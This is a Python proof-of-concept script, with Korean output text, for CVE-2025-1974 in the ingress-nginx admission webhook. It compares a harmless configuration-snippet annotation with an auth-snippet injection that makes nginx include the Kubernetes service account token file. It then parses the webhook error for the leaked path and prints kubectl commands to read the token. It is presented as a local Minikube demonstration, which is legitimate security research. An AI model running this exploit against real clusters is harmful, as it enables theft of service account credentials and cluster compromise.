"""
CVE-2025-1974 비교 시연 — 비교 A vs 비교 B
  A: configuration-snippet  → nginx 정상 처리 (allowed=true, 에러 없음)
  B: auth-snippet + include → nginx가 토큰 파일에 실제 접근 (에러에 파일 경로 포함)
"""

import json
import ssl
import sys
import uuid
import urllib.request
import urllib.error

TARGET = "https://127.0.0.1:8443"
TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"


def make_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def send(annotations: dict) -> dict:
    payload = {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "request": {
            "uid": str(uuid.uuid4()),
            "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
            "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
            "name": "poc", "namespace": "default", "operation": "CREATE",
            "userInfo": {"username": "poc"},
            "object": {
                "apiVersion": "networking.k8s.io/v1", "kind": "Ingress",
                "metadata": {"name": "poc", "namespace": "default", "annotations": annotations},
                "spec": {"ingressClassName": "nginx", "rules": [{
                    "host": "poc.local",
                    "http": {"paths": [{"path": "/", "pathType": "Prefix",
                                        "backend": {"service": {"name": "svc", "port": {"number": 80}}}}]}
                }]}
            }
        }
    }
    req = urllib.request.Request(
        f"{TARGET}/networking/v1/ingresses",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, context=make_ssl_ctx(), timeout=10) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def hr(char="━", width=58):
    print(char * width)


def run_comparison_a():
    hr()
    print("  비교 A — configuration-snippet")
    print("  payload : return 200 'hello';")
    print("  예상    : nginx 정상 처리 → allowed=true, 에러 없음")
    hr()

    resp = send({"nginx.ingress.kubernetes.io/configuration-snippet": "return 200 'hello';"})
    allowed = resp.get("response", {}).get("allowed")
    msg = resp.get("response", {}).get("status", {}).get("message", "(없음)")

    print(f"  allowed : {allowed}")
    print(f"  message : {msg[:120]}")
    print()
    if allowed:
        print("  → nginx가 configuration-snippet 값을 문제없이 처리했다.")
        print("    allow-snippet-annotations=true면 이 어노테이션 자체는 허용된다.")
        print("    (악의적인 값을 넣으면 B처럼 파일 접근이 가능해진다)")
    else:
        print("  → 차단됨. allow-snippet-annotations=false 상태일 수 있다.")


def run_comparison_b():
    hr()
    print("  비교 B — auth-snippet + include /…/token  ★ 핵심")
    print(f"  payload : include {TOKEN_PATH};")
    print("  예상    : nginx가 토큰 파일에 실제 접근 → 에러에 파일 경로 포함")
    hr()

    resp = send({
        "nginx.ingress.kubernetes.io/auth-url":     "http://127.0.0.1:9999/auth",
        "nginx.ingress.kubernetes.io/auth-snippet": f"include {TOKEN_PATH};",
    })

    msg = (resp.get("response", {}).get("status", {}).get("message")
           or json.dumps(resp.get("response", {}), indent=2))

    print("  [webhook 응답 원문]")
    print("  " + "-" * 54)
    for line in msg.splitlines():
        print(f"    {line}")
    print("  " + "-" * 54)
    print()

    if TOKEN_PATH in msg:
        print("  ★ 핵심 증거 발견:")
        for line in msg.splitlines():
            if TOKEN_PATH in line:
                print(f"    >>> {line.strip()}")
        print()
        print("  이 줄의 의미:")
        print("    1) nginx가 컨트롤러 파드 내부에서 토큰 파일을 직접 열었다")
        print("    2) ':1' = JWT가 한 줄짜리 파일임을 nginx가 확인했다")
        print("    3) 이 에러가 webhook HTTP 응답으로 외부 공격자에게 반환됐다")
        print()
        print("  다음 단계 (토큰 확인):")
        POD_CMD = "kubectl get pods -n ingress-nginx -l app.kubernetes.io/component=controller -o name"
        print(f"    POD=$({POD_CMD})")
        print(f"    kubectl exec -n ingress-nginx $POD -- cat {TOKEN_PATH}")
    else:
        print("  토큰 경로가 응답에 없음.")
        print("  allow-snippet-annotations=true 상태인지 확인하세요:")
        print("    kubectl get cm ingress-nginx-controller -n ingress-nginx -o jsonpath='{.data}'")


def main():
    print()
    print("=" * 58)
    print("  CVE-2025-1974 — 비교 A vs B")
    print("  대상: 로컬 Minikube 격리 환경 전용")
    print("=" * 58)

    run_comparison_a()
    print()
    run_comparison_b()

    print()
    hr("=")
    print("  요약")
    hr("=")
    print()
    print("  A (configuration-snippet: return 200 'hello';)")
    print("    → nginx가 정상 처리. 무해한 값이면 에러 없음.")
    print()
    print("  B (auth-snippet: include /…/token;)")
    print("    → nginx -t가 컨트롤러 파드 안에서 실행되면서")
    print("      ServiceAccount 토큰 파일에 직접 접근함.")
    print("      그 에러가 webhook HTTP 응답으로 공격자에게 반환됨.")
    print()
    print("  공통: allow-snippet-annotations=true면 둘 다 차단 안 됨")
    print("  차이: B만 파드 내 임의 파일에 접근할 수 있음")
    print()


if __name__ == "__main__":
    main()
